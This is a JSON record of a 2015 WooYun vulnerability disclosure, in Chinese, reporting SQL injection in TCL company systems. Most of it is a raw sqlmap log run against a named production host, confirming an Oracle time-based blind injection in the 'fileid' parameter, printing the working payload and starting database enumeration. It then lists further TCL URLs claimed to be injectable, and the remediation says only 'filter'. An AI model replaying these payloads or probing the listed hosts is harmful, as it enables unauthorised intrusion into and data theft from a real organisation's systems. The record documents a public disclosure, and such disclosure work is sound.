{"id": 40287, "wybug_id": "wooyun-2015-091971", "wybug_title": "Tcl某重要系统sql注入", "wybug_corp": "TCL集团财务有限公司", "wybug_author": "#6c6c6c", "wybug_date": "2015-01-16 12:09", "wybug_open_date": "2015-01-21 12:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql 详细说明：  \n注入地址:http://oa.tcl.com/weaver/weaver.email.FileDownloadLocation?fileid=39&download=1    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 02:57:59[02:58:00] [INFO] using 'F:\\桌面\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\oa.tcl.com\\session' as session file[02:58:00] [INFO] testing connection to the target url[02:58:00] [INFO] testing if the url is stable, wait a few seconds[02:58:02] [ERROR] there was an error checking the stability of page because oflack of content. please check the page request results (and probable errors) byusing higher verbosity levels[02:58:02] [INFO] testing if GET parameter 'fileid' is dynamic[02:58:02] [INFO] confirming that GET parameter 'fileid' is dynamic[02:58:02] [INFO] GET parameter 'fileid' is dynamic[02:58:02] [WARNING] heuristic test shows that GET parameter 'fileid' might notbe injectable[02:58:02] [INFO] testing sql injection on GET parameter 'fileid'[02:58:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[02:58:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[02:58:04] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[02:58:04] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[02:58:05] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[02:58:06] [INFO] testing 'MySQL > 5.0.11 stacked queries'[02:58:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[02:58:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[02:58:07] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[02:58:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[02:58:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[02:58:09] [INFO] testing 'Oracle AND time-based blind'[02:58:19] [INFO] GET parameter 'fileid' is 'Oracle AND time-based blind' injectable[02:58:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[02:58:21] [INFO] checking if the injection point on GET parameter 'fileid' is a false positiveGET parameter 'fileid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[02:58:39] [INFO] testing if GET parameter 'download' is dynamic[02:58:39] [INFO] confirming that GET parameter 'download' is dynamic[02:58:39] [INFO] GET parameter 'download' is dynamic[02:58:39] [WARNING] heuristic test shows that GET parameter 'download' might not be injectable[02:58:39] [INFO] testing sql injection on GET parameter 'download'[02:58:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[02:58:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[02:58:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[02:58:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[02:58:41] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[02:58:42] [INFO] testing 'MySQL > 5.0.11 stacked queries'[02:58:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[02:58:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[02:58:43] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[02:58:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[02:58:44] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[02:58:45] [INFO] testing 'Oracle AND time-based blind'[02:58:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[02:58:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[02:59:00] [WARNING] GET parameter 'download' is not injectablesqlmap identified the following injection points with a total of 218 HTTP(s) requests:---Place: GETParameter: fileid    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: fileid=39 AND 9718=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(120)||CHR(88),5)&download=1---[02:59:00] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[02:59:00] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[02:59:00] [INFO] fetching database (schema) names[02:59:00] [INFO] fetching number of databases[02:59:00] [INFO] retrieved:[02:59:00] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[02:59:07] [ERROR] invalid character detected. retrying..[02:59:07] [WARNING] increasing time delay to 6 seconds[02:59:15] [ERROR] invalid character detected. retrying..[02:59:15] [WARNING] increasing time delay to 7 seconds[02:59:24] [ERROR] invalid character detected. retrying..[02:59:24] [WARNING] increasing time delay to 8 seconds[02:59:34] [ERROR] invalid character detected. retrying..[02:59:34] [WARNING] increasing time delay to 9 seconds[02:59:44] [ERROR] invalid character detected. retrying..[02:59:44] [WARNING] increasing time delay to 10 seconds[02:59:56] [ERROR] unable to properly validate last character value ('4')..4[03:00:02] [ERROR] invalid character detected. retrying..[03:00:02] [WARNING] increasing time delay to 6 seconds[03:00:10] [ERROR] invalid character detected. retrying..[03:00:10] [WARNING] increasing time delay to 7 seconds[03:00:19] [ERROR] invalid character detected. retrying..[03:00:19] [WARNING] increasing time delay to 8 seconds[03:00:45] [ERROR] invalid character detected. retrying..[03:00:45] [WARNING] increasing time delay to 9 seconds[03:00:56] [ERROR] invalid character detected. retrying..[03:00:56] [WARNING] increasing time delay to 10 seconds[03:01:07] [ERROR] unable to properly validate last character value ('4')..4[03:01:08] [INFO] retrieved:[03:01:21] [ERROR] invalid character detected. retrying..[03:01:21] [WARNING] increasing time delay to 6 seconds[03:01:37] [ERROR] invalid character detected. retrying..[03:01:37] [WARNING] increasing time delay to 7 seconds[03:01:55] [ERROR] invalid character detected. retrying..[03:01:55] [WARNING] increasing time delay to 8 seconds[03:02:14] [ERROR] invalid character detected. retrying..[03:02:14] [WARNING] increasing time delay to 9 seconds[03:02:35] [ERROR] invalid character detected. retrying..[03:02:35] [WARNING] increasing time delay to 10 seconds[03:02:58] [ERROR] unable to properly validate last character value ('a')..a[03:03:19] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request[03:03:33] [ERROR] invalid character detected. retrying..[03:03:33] [WARNING] increasing time delay to 6 seconds[03:03:48] [ERROR] invalid character detected. retrying..[03:03:48] [WARNING] increasing time delay to 7 seconds[03:04:05] [ERROR] invalid character detected. retrying..[03:04:05] [WARNING] increasing time delay to 8 seconds[03:04:24] [ERROR] invalid character detected. retrying..[03:04:24] [WARNING] increasing time delay to 9 seconds[03:04:48] [ERROR] invalid character detected. retrying..[03:04:48] [WARNING] increasing time delay to 10 seconds[03:05:11] [ERROR] unable to properly validate last character value ('q')..q\n\n上面是oa注入\n\nhttp://www.tcl-lighting.com/cn/news-d.aspx?ID=410&SortID=80 ID=410 存在sql注入漏洞http://www.tcl-lighting.com/cn/products-d.aspx?ID=263&SortID=101 ID=263 存在sql注入漏洞http://www.tcl-lighting.com/cn/about.aspx?id=69 存在sql注入漏洞http://www.tcl-lighting.com/cn/resources-d.aspx?ID=401&SortID=98 ID=401 存在sql注入漏洞http://www.tcl-lighting.com/en/products-d.aspx?ID=263&SortID=101 ID=263 存在sql注入漏洞http://www.tcl-lighting.com/en/news-d.aspx?ID=410&SortID=80 ID=410 存在sql注入漏洞http://www.tcl-lighting.com/en/resources-d.aspx?ID=401&SortID=98 ID=401 存在sql注入漏洞http://aobo.tcl.com/leftdy.asp?id=28%27Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e14'[Microsoft][ODBC Microsoft Access Driver] 字符串的语法错误 在查询表达式 'id=28'' 中。/leftdy.asp，行 9\n能来个20分吗？   漏洞证明：     修复方案：  过滤啊。   版权声明：转载请注明来源 #6c6c6c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-21 12:10 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}